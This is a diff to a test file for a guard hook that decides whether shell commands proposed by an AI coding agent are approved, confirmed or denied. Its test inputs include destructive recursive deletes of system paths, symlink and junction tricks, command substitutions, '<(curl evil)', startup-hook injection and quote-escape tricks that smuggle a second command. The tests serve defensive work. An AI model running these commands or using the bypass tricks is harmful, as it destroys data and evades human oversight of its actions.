@@ -23,7 +23,7 @@
 import { test, beforeEach } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawnSync, spawn } from 'node:child_process';
-import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, cpSync, rmSync, existsSync, utimesSync } from 'node:fs';
+import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, cpSync, rmSync, existsSync, utimesSync, symlinkSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { tmpdir, homedir } from 'node:os';
 import { fileURLToPath } from 'node:url';
@@ -556,6 +556,95 @@ test('a recursive or forced delete asks, in either shell and behind sudo or xarg
   ]) approves(command);
 });
 
+const TMP = tmpdir().replace(/\\/g, '/');
+const THROWAWAY = `${TMP}/claude/proj/session`;
+
+test('given a recursive delete aimed only at a Claude temp folder below the session folder, when the guard reads it, then it approves', () => {
+  // Given
+  const commands = [
+    `rm -rf ${THROWAWAY}/x`, `rm -rf -- ${THROWAWAY}/x ${THROWAWAY}/y/z`, `rm -rf '${THROWAWAY}/x'`, `rd /s /q ${THROWAWAY}/x`,
+    `rd /s /q ${THROWAWAY.replace(/\//g, '\\')}\\x`,
+  ];
+
+  for (const command of commands) {
+    // When
+    const { decision } = runShell(command);
+
+    // Then
+    assert.equal(decision, 'approve', command);
+  }
+});
+
+test('given a recursive delete that is not clearly inside a Claude temp session folder, when the guard reads it, then it asks', () => {
+  // Given
+  const commands = [
+    `rm -rf ${TMP}/claude`, `rm -rf ${TMP}/claude/proj`, `rm -rf ${THROWAWAY}`, `rm -rf ${THROWAWAY}/../other`, `rm -rf ${THROWAWAY}/x/..`,
+    'rm -rf claude/proj/session/x', 'Remove-Item -Recurse -Force $env:TEMP\\claude\\proj\\session\\x', 'rd /s /q %TEMP%\\claude\\proj\\session\\x',
+    `rm -rf ${THROWAWAY}/*`, `rm -rf ${THROWAWAY}/x /etc`, `rm -rf ${THROWAWAY}/a/b/c /etc`,
+    `Remove-Item -Recurse -Path ${THROWAWAY}/a,/etc`, `rm -rf ${THROWAWAY}/{a,b}`, `rm -rf ${THROWAWAY}/$(whoami)`,
+    `rm -rf ${THROWAWAY}/x --no-preserve-root`, `sudo rm -rf ${THROWAWAY}/x`, `ls | xargs rm -rf ${THROWAWAY}/x`, 'rm -rf ~/claude/proj/session/x',
+    `rm -r ${THROWAWAY}/x,src`, `rm -r ${THROWAWAY}/x,/Users`, `Remove-Item -Recurse ${THROWAWAY}/x,src`,
+    `cmd /c rd /s /q ${THROWAWAY}/x,src`, `rd /s /q ${THROWAWAY}/x,src`, `rd /s /q ${THROWAWAY}/x=src`, `erase /s /q ${THROWAWAY}/x,src`,
+    `ln -s /home/me/proj ${THROWAWAY}/l && rm -rf ${THROWAWAY}/l/src`, `mklink /J ${THROWAWAY}\\l C:\\proj && rd /s /q ${THROWAWAY}\\l\\src`,
+    `New-Item -ItemType Junction -Path ${THROWAWAY}/l -Target C:/proj; Remove-Item -Recurse -Force ${THROWAWAY}/l/src`,
+    `python3 mklinks.py; rm -rf ${THROWAWAY}/l/src`, `rm -rf ${THROWAWAY}/d && cp -r /tmp/t ${THROWAWAY}/d && rm -rf ${THROWAWAY}/d/x`,
+    `rm -rf ${THROWAWAY}\\x`, `Remove-Item -Recurse -Force ${THROWAWAY}/x`, `ri -r -fo '${THROWAWAY}/x'`,
+    `Remove-Item -Path ${THROWAWAY}/a,${THROWAWAY}/b -Recurse`, `rd /s /q ${THROWAWAY.replace(/\//g, '\\')}\\..\\x`,
+    'rm -rf //server/share/claude/proj/session/x', 'rd /s /q \\\\server\\share\\claude\\proj\\session\\x',
+    `rd /s /q \\\\?\\${THROWAWAY.replace(/\//g, '\\')}\\x`,
+  ];
+
+  for (const command of commands) {
+    // When / Then
+    asks(command, /recursively or by force|previous command/);
+  }
+});
+
+test('given a recursive delete whose operand is a link inside a Claude temp folder, when the guard reads it, then it asks', (t) => {
+  // Given
+  const outside = mkdtempSync(join(tmpdir(), 'guard-outside-'));
+  const project = join(tmpdir(), 'claude', 'linkproj');
+  created.push(outside, project);
+  mkdirSync(join(project, 'linksession'), { recursive: true });
+  const link = join(project, 'linksession', 'link');
+  try { symlinkSync(outside, link, 'junction'); } catch (error) {
+    if (process.platform === 'win32') throw error; // a junction needs no privilege on Windows: never skip silently there
+    t.skip('cannot create a link here'); return;
+  }
+  const linked = link.replace(/\\/g, '/');
+
+  // When / Then
+  asks(`rm -rf ${linked}`, /recursively or by force/);
+  asks(`rm -rf ${linked}/inner`, /recursively or by force/);
+});
+
+test('given a real session folder with a real child, when this session deletes the child, then it approves; another session id asks', () => {
+  // Given
+  const project = join(tmpdir(), 'claude', 'realproj');
+  created.push(project);
+  const child = join(project, 'sess-a', 'child');
+  mkdirSync(join(child, 'inner'), { recursive: true });
+  writeFileSync(join(child, 'inner', 'f.txt'), 'x');
+  const target = child.replace(/\\/g, '/');
+  const withSession = (command, session_id) => runRaw(JSON.stringify({ tool_input: { command }, cwd: onFeature, session_id }));
+
+  // When / Then
+  assert.equal(withSession(`rm -rf ${target}`, 'sess-a').decision, 'approve');
+  assert.equal(withSession(`rd /s /q ${target}`, 'sess-a').decision, 'approve');
+  assert.equal(withSession(`rm -rf ${target}`, 'sess-b').decision, 'ask');
+  assert.equal(existsSync(child), true);
+});
+
+test('given the Windows 8.3 short form of a temp folder, when a delete targets it, then only the payload session folder passes', { skip: process.platform !== 'win32' }, () => {
+  // Given
+  const short = ['C:', 'Users', 'SOMEON~1', 'AppData', 'Local', 'Temp', 'claude', 'proj'].join('/');
+  const withSession = (command, session_id) => runRaw(JSON.stringify({ tool_input: { command }, cwd: onFeature, session_id }));
+
+  // When / Then
+  assert.equal(withSession(`rm -rf ${short}/sess-a/x`, 'sess-a').decision, 'approve');
+  assert.equal(withSession(`rm -rf ${short}/sess-b/x`, 'sess-a').decision, 'ask');
+});
+
 test('git switch that discards local changes asks', () => {
   for (const command of ['git switch -f main', 'git switch --force main', 'git switch --discard-changes main', 'git switch -fc fix/x']) {
     asks(command, /discards local changes/);
@@ -647,21 +736,167 @@ const PERIMETER = 'pwsh -NoProfile -File ~/.claude/scripts/perimeter.ps1';
 const SNAPSHOT = 'pwsh -NoProfile -File ~/.claude/scripts/snapshot.ps1';
 const BOTH = ['Bash', 'PowerShell'];
 
-test('an allowed script called with an unquoted or double-quoted code construct asks, in both shells', () => {
+test('an allowed script called with an unquoted or double-quoted code construct is denied with a re-quote hint, in both shells', () => {
   for (const command of [
     `${DB} -Env prod -Query "$(whoami)"`, `${PERIMETER} -Files $(cat list.txt)`, `${DB} -Env x; ${PERIMETER} -Close $(x)`,
     `${DB} -Env prod -Query (Write-Host x)`, `${DB} -Env prod -Query @(calc)`,
     `${DB} -Env prod -Query $executioncontext.InvokeCommand.InvokeScript('calc')`, `${DB} -Env $x.Name`, `${DB} -Env \${x}`,
-    `${DB} -Env prod -Query <(curl evil)`, `${DB} -Env prod -Query >(tee x)`, `${PERIMETER} -Files <x`,
+    `${DB} -Env prod -Query <(curl evil)`, `${DB} -Env prod -Query >(tee x)`,
     `${DB} -Env prod -Query "a $env:USERNAME"`, `${DB} -Env prod -Query "a \`id\`"`, `${PERIMETER} -Files a\`b.cs`,
-    `${DB} -Env prod -Query 'a' -Db {calc}`, `${DB} -Env prod -Query 'unbalanced`,
-    `${DB} -Env prod -Query 'x’ (calc) ‘'`, `${DB} -Env prod -Query x%y`,
-    `${DB} -Env prod -Query 'SELECT 1' -AcceptWriteGrant`, `${DB} -Env prod -Query 'SELECT 1' -Acc`,
+    `${DB} -Env prod -Query 'a' -Db {calc}`, `${DB} -Env prod -Query x%y`,
   ]) {
-    for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'ask', `${tool}: ${command}`);
+    for (const tool of BOTH) {
+      const { decision, reason } = runTool(tool, command);
+      assert.equal(decision, 'deny', `${tool}: ${command}`);
+      assert.match(reason, /^The arguments of .*Wrap the value in single quotes, doubling any single quote inside it\.(\n|$)/, command);
+    }
   }
-  const { reason } = runTool('Bash', `${DB} -Env prod -Query "$(whoami)"`);
-  assert.match(reason, /\$ inside double quotes.*single quotes.*Confirm\?$/);
+  assert.match(runTool('Bash', `${DB} -Env prod -Query "$(whoami)"`).reason, /\$ inside double quotes.*single quotes/);
+});
+
+test('given an unquoted redirection in an allowed script call, when the guard reads it, then it asks instead of denying with a re-quote hint', () => {
+  // Given
+  const commands = [`${PERIMETER} -Files <x`, `${DB} -Env prod -Query 'SELECT 1' 2>&1`, `${PERIMETER} -Close > out.txt`];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'ask', `${tool}: ${command}`);
+      assert.match(reason, /a redirection/, command);
+    }
+  }
+});
+
+test('given a write-grant switch written with a code construct, when the guard reads it, then it denies and the grant reason rides along', () => {
+  // Given
+  const commands = [`${DB} -Env prod -Acc\`eptWriteGrant`, `${DB} -Env prod -AcceptWriteGrant:$true`, `${DB} -Env prod -AcceptWriteGrant @grant`];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'deny', `${tool}: ${command}`);
+      assert.match(reason, /single quote inside it\.\n\nThis db-ro\.ps1 call carries -AcceptWriteGrant/, command);
+    }
+  }
+});
+
+test('given an unquoted ( $ or @ in an allowed script call, when the guard reads it, then it denies and names the character, in both shells', () => {
+  // Given
+  const cases = [['(', `${DB} -Env prod -Query (Write-Host x)`], ['$', `${DB} -Env $x.Name`], ['@', `${DB} -Env prod -Query @(calc)`]];
+
+  for (const [char, command] of cases) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'deny', `${tool}: ${command}`);
+      assert.ok(reason.includes(`an unquoted ${char}`), reason);
+      assert.match(reason, /Wrap the value in single quotes, doubling any single quote inside it\.$/);
+    }
+  }
+});
+
+test('given an unbalanced or typographic quote, a non-ASCII character, an unfollowable script path, a write-grant switch or an unknown gate runner, when the guard reads it, then it still asks', () => {
+  // Given
+  const commands = [
+    `${DB} -Env prod -Query 'unbalanced`, `${DB} -Env prod -Query 'x’ (calc) ‘'`, `${DB} -Env prod -Query città`,
+    'pwsh -NoProfile -File "~/.claude/scripts/db-ro.ps1 -Env prod',
+    `${DB} -Env prod -Query 'SELECT 1' -AcceptWriteGrant`, `${DB} -Env prod -Query 'SELECT 1' -Acc`,
+    `${DB} -Env prod -Query 'SELECT 1'\u00a0-AcceptWriteGrant`, `${DB} -Env prod -Query 'SELECT 1'\u2002-Acc`,
+    `${GATE} --test "git push --force"`,
+  ];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'ask', `${tool}: ${command}`);
+      assert.match(reason, /Confirm\?$/, command);
+    }
+  }
+});
+
+test('given a quoting deny and another ask in one command, when the guard reads it, then it denies with the hint first and the ask reason after', () => {
+  // Given
+  const command = `${DB} -Env prod -Query $(whoami); git push --force origin x`;
+
+  // When
+  const { decision, reason } = runTool('Bash', command);
+
+  // Then
+  assert.equal(decision, 'deny');
+  assert.match(reason, /^The arguments of db-ro\.ps1.*single quote inside it\.\n\nThis push deletes or force-overwrites a remote ref/s);
+});
+
+test('given an ask from the script check in an earlier or the same script call and a deny after it, when the guard reads it, then it denies', () => {
+  // Given
+  const commands = [
+    `${DB} -Env prod -Query città; ${PERIMETER} -Close $(x)`, `${DB} -Env prod -Query 'x' -Acc; ${SNAPSHOT} -Since $(whoami)`,
+    `${DB} -Env prod -Query città $(whoami)`, `${GATE} --test "git push --force"; ${PERIMETER} -Close $(x)`,
+  ];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'deny', `${tool}: ${command}`);
+      assert.match(reason, /single quote inside it\./, command);
+    }
+  }
+});
+
+test('given a substitution after an unfollowable quoted script path, or beside a write-grant switch, when the guard reads it, then it denies and names the grant', () => {
+  // Given
+  const hidden = ['pwsh -NoProfile -File "~/.claude/scripts/db-ro.ps1 $(calc)"', 'pwsh -NoProfile -File "~/.claude/scripts/db-ro.ps1 `calc`"'];
+  const withGrant = `${DB} -Env prod -AcceptWriteGrant -Query $(calc)`;
+
+  for (const tool of BOTH) {
+    for (const command of hidden) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'deny', `${tool}: ${command}`);
+      assert.match(reason, /single quote inside it\./, command);
+    }
+    // When
+    const { decision, reason } = runTool(tool, withGrant);
+
+    // Then
+    assert.equal(decision, 'deny', `${tool}: ${withGrant}`);
+    assert.match(reason, /-AcceptWriteGrant/);
+  }
+});
+
+test('given two asks from the script check in one command, when the guard reads it, then the prompt names both, the write grant included', () => {
+  // Given
+  const commands = [
+    `${DB} -Env prod -Query città -AcceptWriteGrant`,
+    `${SNAPSHOT} -Since città; ${DB} -Env prod -Query 'x' -AcceptWriteGrant`,
+  ];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const { decision, reason } = runTool(tool, command);
+
+      // Then
+      assert.equal(decision, 'ask', `${tool}: ${command}`);
+      assert.match(reason, /outside printable ASCII/, command);
+      assert.match(reason, /-AcceptWriteGrant/, command);
+    }
+  }
 });
 
 test('legitimate arguments of the allowed scripts pass, in both shells', () => {
@@ -677,40 +912,42 @@ test('legitimate arguments of the allowed scripts pass, in both shells', () => {
   }
 });
 
-test('snapshot.ps1 is guarded like perimeter.ps1: a code construct in its arguments asks, the loop call passes, in both shells', () => {
+test('snapshot.ps1 is guarded like perimeter.ps1: a code construct in its arguments is denied, the loop call passes, in both shells', () => {
   for (const command of [
     `${SNAPSHOT} -Since $(whoami)`, `${SNAPSHOT} -Since abc -Dirty "$env:USERNAME"`, `${SNAPSHOT} -Since abc -Start (calc)`,
-    `${SNAPSHOT} -Since abc -Dirty 'a' -Start {calc}`, `${SNAPSHOT} -Since abc -Dirty 'unbalanced`, `${SNAPSHOT} -Since abc; ${PERIMETER} -Close $(x)`,
+    `${SNAPSHOT} -Since abc -Dirty 'a' -Start {calc}`, `${SNAPSHOT} -Since abc; ${PERIMETER} -Close $(x)`,
     `${SNAPSHOT} -Since abc -Dirty a\`b.cs`, `${SNAPSHOT} -Since <(curl evil)`,
   ]) {
-    for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'ask', `${tool}: ${command}`);
+    for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'deny', `${tool}: ${command}`);
   }
+  for (const tool of BOTH) assert.equal(runTool(tool, `${SNAPSHOT} -Since abc -Dirty 'unbalanced`).decision, 'ask', tool);
   for (const command of [
     `${SNAPSHOT} -Since HEAD`, `${SNAPSHOT} -Since 4b825dc642cb6eb9a060e54bf8d69288fbee4904 -Start abc123`,
     `${SNAPSHOT} -Since t1 -Start abc123 -Dirty 'src/Other/User.cs,it''s/'`,
   ]) {
     for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'approve', `${tool}: ${command}`);
   }
-  assert.match(runTool('Bash', `${SNAPSHOT} -Since $(whoami)`).reason, /arguments of snapshot\.ps1.*Confirm\?$/);
+  assert.match(runTool('Bash', `${SNAPSHOT} -Since $(whoami)`).reason, /arguments of snapshot\.ps1.*single quotes/);
 });
 
 const SCOPE_GUARD = 'node ~/.claude/hooks/scope-guard.js';
 
-test('scope-guard.js --check is guarded like the allowed scripts: a code construct asks, the loop call passes, in both shells', () => {
+test('scope-guard.js --check is guarded like the allowed scripts: a code construct is denied, the loop call passes, in both shells', () => {
   for (const command of [
     `${SCOPE_GUARD} --check $(whoami)`, `${SCOPE_GUARD} --check HEAD --dirty "$env:USERNAME"`, `${SCOPE_GUARD} --check (calc)`,
-    `${SCOPE_GUARD} --check HEAD --dirty 'unbalanced`, `${SCOPE_GUARD} --check HEAD --dirty a\`b.cs`, `${SCOPE_GUARD} --check <(curl evil)`,
+    `${SCOPE_GUARD} --check HEAD --dirty a\`b.cs`, `${SCOPE_GUARD} --check <(curl evil)`,
     `${SCOPE_GUARD} --check HEAD; ${PERIMETER} -Close $(x)`,
   ]) {
-    for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'ask', `${tool}: ${command}`);
+    for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'deny', `${tool}: ${command}`);
   }
+  for (const tool of BOTH) assert.equal(runTool(tool, `${SCOPE_GUARD} --check HEAD --dirty 'unbalanced`).decision, 'ask', tool);
   for (const command of [
     `${SCOPE_GUARD} --check HEAD`, `${SCOPE_GUARD} --check 4b825dc642cb6eb9a060e54bf8d69288fbee4904 --dirty 'src/a.cs,it''s/'`,
     `${SCOPE_GUARD} --check abc123 --dirty src/a.cs,src/b.cs`,
   ]) {
     for (const tool of BOTH) assert.equal(runTool(tool, command).decision, 'approve', `${tool}: ${command}`);
   }
-  assert.match(runTool('Bash', `${SCOPE_GUARD} --check $(whoami)`).reason, /arguments of scope-guard\.js.*Confirm\?$/);
+  assert.match(runTool('Bash', `${SCOPE_GUARD} --check $(whoami)`).reason, /arguments of scope-guard\.js.*single quotes/);
 });
 
 const GATE = 'node ~/.claude/scripts/gate.mjs --root . --head abc123';
@@ -721,7 +958,7 @@ test('given gate.mjs called with a known test runner, when the guard reads it, t
     `${GATE} --test 'dotnet test --logger "console;verbosity=normal"'`,
     `${GATE} --test 'node --test tools/gate.test.mjs'`,
     `${GATE} --red --unit 'npx vitest run' --test-files a.test.ts`,
-    `${GATE} --test 'dotnet test -r linux-x64 -e FOO=1'`,
+    `${GATE} --test 'dotnet test -r linux-x64'`,
   ];
 
   for (const command of commands) {
@@ -768,6 +1005,89 @@ test('given gate.mjs off Windows with sh quoting that hides a semicolon, when th
   assert.equal(result.decision, 'ask');
 });
 
+test('given a test command whose options run inline code, when the guard reads it, then it asks in both shells', () => {
+  // Given
+  const commands = [
+    `${GATE} --test 'dotnet test -p:Foo=1'`,
+    `${GATE} --test 'dotnet test /p:Foo=1'`,
+    `${GATE} --test 'dotnet test -property:Foo=1'`,
+    `${GATE} --test 'dotnet test /property:Foo=1'`,
+    `${GATE} --test 'dotnet test -t:Foo'`,
+    `${GATE} --test 'dotnet test /t:Foo'`,
+    `${GATE} --test 'dotnet test -target:Foo'`,
+    `${GATE} --test 'dotnet test -e DOTNET_STARTUP_HOOKS=x.dll'`,
+    `${GATE} --test 'dotnet test --environment DOTNET_STARTUP_HOOKS=x.dll'`,
+    `${GATE} --test 'npm test --script-shell calc.exe'`,
+    `${GATE} --test 'pnpm test --node-options=--require=x.js'`,
+    `${GATE} --test 'yarn test --node-options x'`,
+  ];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const result = runTool(tool, command);
+
+      // Then
+      assert.equal(result.decision, 'ask', `${tool}: ${command}`);
+    }
+  }
+});
+
+test('given gate.mjs called with the hidden --supervise or --run flag, when the guard reads it, then it asks in both shells', () => {
+  // Given
+  const commands = [`${GATE} --supervise --run abc`, `${GATE} --test 'npm test' --run abc`, `${GATE} --supervise`];
+
+  for (const command of commands) {
+    for (const tool of BOTH) {
+      // When
+      const result = runTool(tool, command);
+
+      // Then
+      assert.equal(result.decision, 'ask', `${tool}: ${command}`);
+    }
+  }
+});
+
+test('given a backslash inside double quotes under Bash, when the guard reads an allowed script call, then it asks', () => {
+  // Given
+  const commands = [
+    String.raw`${GATE} --test "npm test x\" "\""&calc"`,
+    String.raw`${PERIMETER} -Files "a\" "\""&calc"`,
+    String.raw`${DB} -Env prod -Query "\"" ; calc # "`,
+    String.raw`${PERIMETER} -Files "\"" ; calc # "`,
+    String.raw`${DB} -Env prod -Query "\"" -AcceptWriteGrant # "`,
+  ];
+
+  for (const command of commands) {
+    // When
+    const result = runTool('Bash', command);
+
+    // Then
+    assert.equal(result.decision, 'ask', command);
+  }
+});
+
+const SWEEP = 'node ~/.claude/scripts/sweep.mjs';
+
+test('given sweep.mjs called with code in its arguments, when the guard reads it, then it denies with the re-quote hint and names sweep.mjs', () => {
+  // Given
+  const risky = [`${SWEEP} --root $(whoami) --since 2026-01-01T00:00:00Z`, `${SWEEP} --root (calc) --close`, `${SWEEP} --root "$env:TEMP" --close`];
+  const plain = [`${SWEEP} --root . --since 2026-01-01T00:00:00Z --close`, `${SWEEP} --root 'C:\\wt\\repo' --since 2026-01-01T00:00:00Z`];
+
+  for (const tool of BOTH) {
+    // When
+    const denied = risky.map((command) => runTool(tool, command));
+    const approved = plain.map((command) => runTool(tool, command));
+
+    // Then
+    for (const result of denied) {
+      assert.equal(result.decision, 'deny', tool);
+      assert.match(result.reason, /arguments of sweep\.mjs.*single quote inside it\.$/, tool);
+    }
+    for (const result of approved) assert.equal(result.decision, 'approve', tool);
+  }
+});
+
 test('settings.json allows the scope-guard --check call in both shells, and only that call', () => {
   const { allow } = JSON.parse(readFileSync(join(dirname(HOOK), '..', 'settings.json'), 'utf8')).permissions;
   for (const shell of ['Bash', 'PowerShell']) assert.ok(allow.includes(`${shell}(node ~/.claude/hooks/scope-guard.js --check *)`), shell);
@@ -775,7 +1095,7 @@ test('settings.json allows the scope-guard --check call in both shells, and only
 });
 
 test('db-ro.ps1 -AcceptWriteGrant, in any abbreviation, asks; the other parameters do not', () => {
-  for (const arg of ['-AcceptWriteGrant', '-acceptwritegrant', '-Accept', '-A', '-a', "'-AcceptWriteGrant'", '"-A"', '\u2013AcceptWriteGrant', '-Acc`eptWriteGrant', '@grant', '-AcceptWriteGrant:$true']) {
+  for (const arg of ['-AcceptWriteGrant', '-acceptwritegrant', '-Accept', '-A', '-a', "'-AcceptWriteGrant'", '"-A"', '\u2013AcceptWriteGrant']) {
     for (const tool of BOTH) {
       const { decision, reason } = runTool(tool, `${DB} -Env prod -Query 'select 1' ${arg}`);
       assert.equal(decision, 'ask', `${tool}: ${arg}`);
